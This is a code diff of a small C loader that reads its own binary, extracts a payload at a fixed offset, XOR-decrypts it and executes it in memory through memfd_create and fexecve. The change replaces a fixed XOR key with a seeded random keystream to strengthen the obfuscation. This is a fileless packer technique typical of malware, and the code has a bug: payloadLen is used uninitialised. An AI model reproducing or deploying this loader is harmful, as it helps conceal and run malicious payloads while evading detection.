@@ -8,20 +8,22 @@
 #include <string.h>
 
 int main(int argc, char **argv) {
-	int OFFSET = 17192;
+	int OFFSET = 0x704f6666;
 	int payloadLen;
 	int payloadFd;
 
 	char filePath[1000];
 
-    	FILE *file;
+    FILE *file;
 	char *buffer;
 	unsigned long fileLen;
 
-    	unsigned char *payload;
-	int key = 12345;
+    unsigned char *payload;
+	int key = 0x6b657931;
 
-    	readlink("/proc/self/exe", filePath, 1000);
+	srand(key);
+
+    readlink("/proc/self/exe", filePath, 1000);
 
 	file = fopen(filePath, "rb");
 	fseek(file, 0, SEEK_END);
@@ -32,18 +34,18 @@ int main(int argc, char **argv) {
 	fread(buffer, fileLen, 1, file);
 	fclose(file);
 
-    	payload = malloc(payloadLen);
+    payload = malloc(payloadLen);
 
 	memcpy(payload, buffer + OFFSET, payloadLen);
 
 	for (int i = 0; i < payloadLen; i++) {
-        payload[i] = payload[i] ^ key % 256;
+        payload[i] = payload[i] ^ random() % 256;
 	}
 
 	payloadFd = memfd_create("", 0);
 	write(payloadFd, payload, payloadLen);
 	char *payloadArgv[] = { argv };
-    	char *payloadEnv[] = { NULL };
-    	fexecve(payloadFd, payloadArgv , payloadEnv);
+    char *payloadEnv[] = { NULL };
+    fexecve(payloadFd, payloadArgv , payloadEnv);
 
 }
